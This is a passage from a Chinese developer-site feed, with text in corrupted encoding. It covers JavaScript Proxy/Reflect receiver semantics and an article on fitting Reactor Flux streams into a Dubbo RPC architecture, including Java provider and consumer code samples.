<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj,key,proxy) <span class="hljs-comment">// &lt;- åŒºåˆ«åœ¨è¿™</span>
    }
})

proxy.<span class="hljs-property">c</span> <span class="hljs-comment">// å°†ä¼šåˆ†åˆ«æ‰“å° read cã€read aã€read b ï¼Œå¹¶è¾“å‡º proxy çš„ c å±æ€§</span>
</code></pre>
<p>æœ€ç»ˆè¾“å‡ºæ°å¥½å¦‚ç›®æ ‡æ‰€è¨€</p>
<h2 data-id="heading-4">ç»“æŸäº†ä¹ˆï¼Ÿ</h2>
<p>ç»†å¿ƒçš„æœ‹å‹å¯èƒ½ä¼šæƒ³åˆ°ï¼Œæˆ‘èƒ½ä¸èƒ½ç”¨<code>receiver</code>æ¥æ›¿ä»£<code>proxy</code>å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>,
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">c</span>(){
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">b</span>
    }
}

<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj,{
    <span class="hljs-attr">get</span>:<span class="hljs-function">(<span class="hljs-params">target,key,receiver</span>)=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'read'</span>,key)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj,key,receiver) <span class="hljs-comment">// &lt;- åŒºåˆ«åœ¨è¿™</span>
    }
})

proxy.<span class="hljs-property">c</span>
</code></pre>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹ MDN æ€ä¹ˆè§£é‡Šçš„</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf16bd47c8ac43f5a5b2eca5f1e5a462~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VwdDk0MA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541948&amp;x-signature=vp4HA%2B9MzPvXyKrs6zM5bToABKY%3D" alt="image.png" loading="lazy"/></p>
<p><code>receiver</code>è¡¨ç¤º Proxy æˆ–è€…ç»§æ‰¿ Proxy çš„å¯¹è±¡</p>
<p>ç°åœ¨æˆ‘ä»¬æ¥åŒºåˆ†ä¸€ä¸‹</p>
<ol>
<li>å¦‚æœå¡«çš„æ˜¯<code>proxy</code>ï¼Œåˆ™æ‰€ç”¨åˆ°çš„ä»£ç†æ‹¦æˆªæ°¸è¿œæ˜¯<code>proxy</code>æœ¬èº«</li>
<li>å¦‚æœå¡«çš„æ˜¯<code>receiver</code>ï¼Œåˆ™æ‰€ç”¨åˆ°çš„ä»£ç†æ‹¦æˆªåˆ™æ˜¯å‘å±æ€§è®¿é—®çš„å¯¹è±¡æœ¬èº«ï¼Œä¹Ÿå°±æ˜¯æœ‰å¯èƒ½æ˜¯<code>proxy</code>ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ç»§æ‰¿è‡ª<code>proxy</code>çš„å­ç±»</li>
</ol>
<h2 data-id="heading-5">æ€»ç»“</h2>
<p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»åŸºæœ¬å®ç°äº†ä¸€ä¸ªç®€å•çš„å…¨é¢æ‹¦æˆªå±æ€§çš„ä»£ç†å¯¹è±¡ï¼Œä½†æ˜¯è‡³äºç”¨<code>receiver</code>è¿˜æ˜¯<code>proxy</code>ï¼Œè¿™å½“ç„¶å°±çœ‹å…·ä½“çš„ä¸šåŠ¡éœ€æ±‚äº†</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1åˆ†é’Ÿäº†è§£å“åº”å¼ç¼–ç¨‹ | åˆé€‚çš„æ¶æ„è°ƒæ•´]]></title>    <link>https://juejin.cn/post/7592996072705507378</link>    <guid>https://juejin.cn/post/7592996072705507378</guid>    <pubDate>2026-01-09T05:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705507378" data-draft-id="7592992745573662758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1åˆ†é’Ÿäº†è§£å“åº”å¼ç¼–ç¨‹ | åˆé€‚çš„æ¶æ„è°ƒæ•´"/> <meta itemprop="keywords" content="åç«¯,Java,å“åº”å¼ç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-09T05:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Marsé…±"/> <meta itemprop="url" content="https://juejin.cn/user/1714893869821278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1åˆ†é’Ÿäº†è§£å“åº”å¼ç¼–ç¨‹ | åˆé€‚çš„æ¶æ„è°ƒæ•´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893869821278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Marsé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:47:36.000Z" title="Fri Jan 09 2026 05:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ï¼šMarsé…±</p>
<p>å£°æ˜ï¼šæœ¬æ–‡ç« ç”±Marsé…±ç¼–å†™ï¼Œéƒ¨åˆ†å†…å®¹æ¥æºäºç½‘ç»œï¼Œå¦‚æœ‰ç–‘é—®è¯·è”ç³»æœ¬äººã€‚</p>
<p>è½¬è½½ï¼šæ¬¢è¿è½¬è½½ï¼Œè½¬è½½å‰å…ˆè¯·è”ç³»æˆ‘ï¼</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šç¯‡æˆ‘ä»¬è®²åˆ°äº†dubboå®˜æ–¹çš„ä¾‹å­ï¼Œæ ¹æ®å“åº”å¼çš„åŸºæœ¬æ¦‚å¿µï¼Œdubbo çš„ StreamObserver <strong>å¹¶ä¸æä¾›å†…ç½®èƒŒå‹æ”¯æŒã€‚</strong></p>
<p>æ¯•ç«ŸRPCçš„è®¾è®¡åˆè¡·ä¸æ˜¯ä¸ºäº†å“åº”å¼è€Œè®¾è®¡çš„ï¼Œçœ‹ä¸‹å·®å¼‚å§</p>
<h2 data-id="heading-1">RPC å’Œ å“åº”å¼ çš„å·®å¼‚</h2>

























<table><thead><tr><th/><th>RPC</th><th>å“åº”å¼</th></tr></thead><tbody><tr><td>æ˜¯å¦é˜»å¡</td><td>â­•ï¸</td><td>â</td></tr><tr><td>è¿”å›å€¼</td><td>å•å€¼ï¼ˆä¸€æ¬¡è°ƒç”¨ï¼Œä¸€æ¬¡è¿”å›å€¼ï¼‰</td><td>å¤šå€¼ï¼ˆä¸€æ¬¡è°ƒç”¨ï¼Œæµå¼è¿”å›å€¼ï¼‰</td></tr><tr><td>èƒŒå‹</td><td>ä¸æ”¯æŒã€‚å®¢æˆ·ç«¯è¯·æ±‚ï¼ŒæœåŠ¡ç«¯å“åº”å¹¶æ¨é€ï¼Œä¸ç®¡å®¢æˆ·ç«¯æ˜¯å¦æœ‰èƒ½åŠ›æ¶ˆè´¹</td><td>æ”¯æŒã€‚å®¢æˆ·ç«¯è¯·æ±‚ï¼ŒæœåŠ¡ç«¯æ¨é€ï¼Œå®¢æˆ·ç«¯æ¶ˆè´¹å¯ä»¥æ§åˆ¶æ¶ˆè´¹é€Ÿåº¦ï¼Œå†å‘æœåŠ¡ç«¯æ‹¿ã€‚</td></tr></tbody></table>
<p>æ—¢ç„¶æœ‰å·®å¼‚ï¼Œé‚£å¦‚ä½•å®Œç¾å¤„ç†</p>
<h2 data-id="heading-2">å»ºç«‹å·¥ç¨‹</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬ç¡®è®¤ä¸€ä¸‹ç›®æ ‡ï¼š</p>
<ol>
<li>å·¥ç¨‹æ˜¯dubboæ¡†æ¶ï¼›</li>
<li>å·¥ç¨‹æ”¯æŒ Flowable èƒŒå‹å¼å“åº”</li>
</ol>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªdubboå·¥ç¨‹ï¼Œç»å…¸çš„consumerå±‚ã€facadeå±‚ã€providerå±‚ä¸‰å±‚ç»“æ„ï¼Œåƒæ˜¯ä¸‹é¢è¿™æ ·ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/589fa9deeeef466f9648531d2446385d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=uZ8T7IXDdvQ0wJxlWBpAmOlHBe4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">dubbo provider</h3>
<p>è¿™æ˜¯æœåŠ¡æä¾›è€…å·¥ç¨‹ï¼Œæä¾›è€…ç»™æ¶ˆè´¹è€…æä¾›æ¯ç§’å‘é€ä¸€ä¸ªåºåˆ—å·ï¼Œåºåˆ—å·æ˜¯æ—¶é—´çš„æ¯«ç§’æ•°ï¼Œä¸Šç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@DubboService(protocol = "tri")</span> <span class="hljs-comment">// â† æ˜¾å¼æŒ‡å®šç«¯å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EventService</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Flux&lt;Event&gt; <span class="hljs-title function_">streamRealTimeEvents</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>))
                .map(seq -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + seq, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
    }
}
</code></pre>
<p>dubboå¯¹å¤–æä¾› Flux æµï¼ŒFluxæ˜¯reactor-core è¿™ä¸ªjaråŒ…ä¸­çš„ç±»ï¼Œå®ƒçš„ä¼˜åŠ¿æ˜¯å’Œspringå®¶æ—çš„é›†æˆæ¯”è¾ƒå¥½ï¼Œæ¯”å¦‚ï¼šspring webfluxã€‚å®ƒæ˜¯å¤©ç„¶æ”¯æŒèƒŒå‹çš„å¯¹è±¡ã€‚</p>
<h3 data-id="heading-4">dubbo consumer</h3>
<p>è°ƒç”¨çš„åœ°æ–¹è·Ÿæˆ‘ä»¬è°ƒç”¨æœ¬åœ°æ¥å£ä¸€æ ·ï¼Œè¿™æ˜¯RPCçš„è§„èŒƒï¼Œå› æ­¤æˆ‘ä»¬åœ¨consumerç«¯å†™ä¸€ä¸ªå•å…ƒæµ‹è¯•åŒºè°ƒç”¨ï¼Œä¸Šç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootTest(classes = DubboConsumerApplication.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventServiceTest</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(EventServiceTest.class);
    <span class="hljs-comment">// ğŸ‘‡ å…³é”®ï¼šé€šè¿‡ url ç›´è¿ï¼Œä¸èµ°æ³¨å†Œä¸­å¿ƒ</span>
    <span class="hljs-meta">@DubboReference(
            protocol = "tri",
            url = "tri://127.0.0.1:50051"  // â† ç›´è¿åœ°å€
    )</span>
    <span class="hljs-keyword">private</span> EventService eventService;

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo</span><span class="hljs-params">()</span> {
        Flux&lt;Event&gt; eventFlux = eventService.streamRealTimeEvents();
        eventFlux
                .take(<span class="hljs-number">5</span>) <span class="hljs-comment">// åªå–å‰5ä¸ªäº‹ä»¶</span>
                .doOnNext(data -&gt; {
                    log.info(<span class="hljs-string">"&gt;&gt; data:{}"</span>, data);
                })
                .blockLast(); <span class="hljs-comment">// é˜»å¡ç›´åˆ°æœ€åä¸€ä¸ªå…ƒç´ åˆ°è¾¾æˆ–æµå®Œæˆ</span>
    }
}
</code></pre>
<p>å¥½äº†ï¼Œæˆ‘ä»¬è¿è¡Œæ£€éªŒå§ï¼</p>
<p>å·¥ç¨‹ä¸»è¦ä½¿ç”¨ spring-boot + dubbo-triple ï¼Œå…ˆå¯åŠ¨providerå·¥ç¨‹ï¼Œå½“å‡ºç°</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c1bb29e0e234fd08550b46f7e64af7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=Z297irSJK0jH%2BWWCbjtExBfLXlA%3D" alt="" loading="lazy"/></p>
<p>è¿™æ ·çš„æ—¥å¿—çš„æ—¶å€™ï¼Œè¡¨ç¤ºå¯åŠ¨å·²ç»æˆåŠŸäº†ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¼€å§‹æµå¼è°ƒç”¨å§ï¼Œè¿è¡Œconsumerä¸­çš„é‚£ä¸ªå•å…ƒæµ‹è¯•ï¼Œç»“æœ...</p>
<h2 data-id="heading-5">å‡ºé”™äº†</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a75ba913f97a4e7da5bb4821d945c4d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=zkT0JlyVHR7NI8TYQ9fRczaJ%2BoA%3D" alt="" loading="lazy"/></p>
<p>è¿è¡Œä¹‹åï¼ŒæŠ¥é”™ï¼é”™è¯¯æç¤ºè¯´æ˜¯å› ä¸º reactor.core.publisher.FluxMap å¯¹è±¡æ²¡æœ‰å®ç° Serializable æ¥å£ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿå› ä¸º<strong>RPCçš„ä¼ è¾“åè®®ä¸­å¯¹äºåºåˆ—åŒ–çš„æ£€æŸ¥æ˜¯æœ‰è¦æ±‚çš„</strong>ã€‚</p>
<p>å°±ç®—æˆ‘ä»¬é€šè¿‡é…ç½®yamlæ–‡ä»¶çš„åºåˆ—åŒ–æ£€æŸ¥å…³é—­æ‰ã€æŠŠåŒ…åŠ å…¥ç™½åå•ï¼Œéƒ½æ˜¯æ— æµäºäº‹æ— æ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>é‚£æˆ‘åˆæƒ³æœ‰èƒŒå‹ï¼Œåˆæƒ³ä½¿ç”¨dubboï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<h2 data-id="heading-6">å®Œç¾çš„è§£å†³æ–¹æ¡ˆæœ‰å—ï¼Ÿ</h2>
<p>æœ‰ï¼éœ€è¦ä¿®æ”¹ç»“æ„ï¼</p>
<p>å…¶å®ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å…¸å‹çš„ <strong>â€œå†…éƒ¨å“åº”å¼ + å¤–éƒ¨ RPC åŒæ­¥â€ æ¶æ„é—®é¢˜</strong>ã€‚ä½ çš„ç›®æ ‡éœ€è¦ä¿®æ”¹ä¸ºï¼š</p>
<ul>
<li><strong>provider å±‚</strong>ï¼šåªä¼ è¾“ç®€å• JavaBeanï¼Œä¸æš´éœ² Flux/Flowableï¼›</li>
<li><strong>consumer å±‚</strong>ï¼šæ¥æ”¶åˆ° providerå±‚çš„JavaBeanä¹‹åï¼Œå†å°è£…ä¸ºFlux/Flowable æµï¼›</li>
<li>å¦‚æœè¿˜æœ‰å¯¹å¤–å±‚ï¼Œæ¯”å¦‚webå±‚çš„controllerï¼šå¯¹å¤–æä¾› Flux/Flowable æ¥å£ï¼ˆä¾‹å¦‚ç”¨äº SSEã€æµå¼å“åº”ç­‰ï¼‰ï¼›</li>
</ul>
<p>æ€»ä¹‹ï¼Œä¸åº”è¯¥åœ¨RPCçš„ä¼ è¾“å±‚å»ä¼ è¾“Flux/Flowableå¯¹è±¡ï¼ŒRPCçš„æ¥å£åªè¿”å›æ­£å¸¸çš„POJOå¯¹è±¡ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šæš´éœ² å†…éƒ¨ç±»å‹</span>
Flux&lt;Event&gt; <span class="hljs-title function_">streamRealTimeEvents</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// æ­£ç¡®ï¼šè¿”å›æ™®é€šå¯¹è±¡</span>
List&lt;Event&gt; <span class="hljs-title function_">listRealTimeEvents</span><span class="hljs-params">()</span>;
</code></pre>
<p>ä¿®æ”¹åçš„provideræ˜¯è¿™æ ·ï¼Œä¸Šç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;Event&gt; <span class="hljs-title function_">listRealTimeEvents</span><span class="hljs-params">()</span> {
	List&lt;Event&gt; eventList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
		eventList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + i, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
		<span class="hljs-keyword">try</span> {
			Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// æ¯ç§’æ·»åŠ ä¸€ä¸ª</span>
		} <span class="hljs-keyword">catch</span> (InterruptedException e) {
			Thread.currentThread().interrupt();
			<span class="hljs-keyword">break</span>;
		}
	}
	<span class="hljs-keyword">return</span> eventList;
}
</code></pre>
<p>ä¿®æ”¹åçš„ consumeræ˜¯è¿™æ ·ï¼Œä¸Šç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo2</span><span class="hljs-params">()</span> {
	List&lt;Event&gt; events = eventService.listRealTimeEvents();

	<span class="hljs-comment">// å°† List è½¬æ¢æˆ Flux æµ</span>
	Flux&lt;Event&gt; eventFlux = Flux.fromIterable(events);
}
</code></pre>
<h2 data-id="heading-7">è¿›é˜¶ç†è§£</h2>
<p>å¦‚æœä½ çš„å·¥ç¨‹åƒæˆ‘è¿™æ ·ï¼Œæœ‰æ—¶é—´ä¸Šçš„ç´§å¯†å…³è”ï¼Œé‚£ä¹ˆè¿™ä¹ˆåšæ˜¯æœ‰é—®é¢˜çš„ï¼</p>
<p>å› ä¸ºproviderå±‚æ¯ç§’äº§ç”Ÿä¸€ç»„åºåˆ—å·ï¼Œè¿”å›ç»™consumerå±‚ä¹‹åï¼Œæœ‰æ—¶é—´æ¶ˆè€—ï¼Œä½†æ˜¯å¦‚æœä½ çš„åœºæ™¯å’Œæ—¶é—´æ— å…³çš„ï¼Œé‚£ä¹ˆä¸Šé¢è¿™ç§æ–¹å¼å°±æ»¡è¶³ä½ çš„åœºæ™¯äº†ï¼Œå¦‚æœåœºæ™¯å’Œæ—¶é—´æœ‰å…³ï¼Œé‚£ä¹ˆæ ¹æ®ä½ çš„åœºæ™¯æœ€åˆé€‚çš„æ–¹å¼å¯èƒ½å°±æ˜¯åœ¨consumerå±‚å»åšFlux/Flowableçš„æµå¤„ç†ï¼Œprovideråˆ™è´Ÿè´£å¤„ç†æ™®é€šcrudé€»è¾‘ã€‚</p>
<p>å› ä¸º Dubbo æ˜¯ â€œè¯·æ±‚-å“åº”â€æ¨¡å‹ï¼Œå¿…é¡»ç­‰ listRealTimeEvents() å®Œå…¨æ‰§è¡Œå®Œæ‰èƒ½è¿”å› Listï¼Œ<strong>ä¸­é—´è¿‡ç¨‹æ— æ³•å®æ—¶æ¨é€ç»™ consumerï¼Œç†è®ºä¸Šä¸ç®—æ˜¯çœŸæ­£çš„â€œå®æ—¶æµå¼ä¼ è¾“â€</strong> ã€‚</p>
<h2 data-id="heading-8">çœŸæ­£çš„æµå¼æ–¹æ¡ˆ</h2>
<p>å¦‚æœä½ <strong>å¿…é¡»å®æ—¶æ¨é€æ¯ä¸ª chunk</strong>ï¼ˆå¦‚å¤§æ¨¡å‹é€å­—è¾“å‡ºï¼‰ï¼Œåˆ™ <strong>ä¸èƒ½ä¾èµ– Dubbo ä½œä¸ºä¸­é—´å±‚</strong>ï¼Œä»¥ä¸‹æœ‰å‡ ä¸ªå»ºè®®ï¼š</p>
<h3 data-id="heading-9">å»ºè®®1ï¼šç»•è¿‡ Dubboï¼Œconsumer ç›´æ¥æµå¼å¤„ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo2</span><span class="hljs-params">()</span> {
	Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>))
                .map(seq -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + seq, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
}
</code></pre>
<p>å¯¹ï¼Œä½ æ²¡çœ‹é”™ï¼Œæœ¬æ¥providerçš„å¤„ç†é€»è¾‘ç›´æ¥æ¬åˆ°consumerå±‚ï¼Œè¿™æ ·åš</p>
<p>ä¼˜ç‚¹ï¼šçœŸæ­£å®æ—¶ï¼›<br/>
ç¼ºç‚¹ï¼šå¤±å» Dubbo çš„æœåŠ¡æ²»ç†èƒ½åŠ›ï¼ˆè´Ÿè½½å‡è¡¡ã€ç†”æ–­ç­‰ï¼‰ã€‚</p>
<h3 data-id="heading-10">å»ºè®®2ï¼šä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ— or WebSocket åšå¼‚æ­¥é€šçŸ¥</h3>
<ol>
<li>Dubbo æ¥æ”¶è¯·æ±‚åï¼Œæäº¤ä»»åŠ¡åˆ° MQï¼›</li>
<li>å¼‚æ­¥æ¶ˆè´¹ MQï¼Œè°ƒç”¨ Coze SDKï¼›</li>
<li>æ¯æ”¶åˆ°ä¸€ä¸ª chunkï¼Œé€šè¿‡ WebSocket/SSE æ¨é€ç»™å‰ç«¯ï¼›</li>
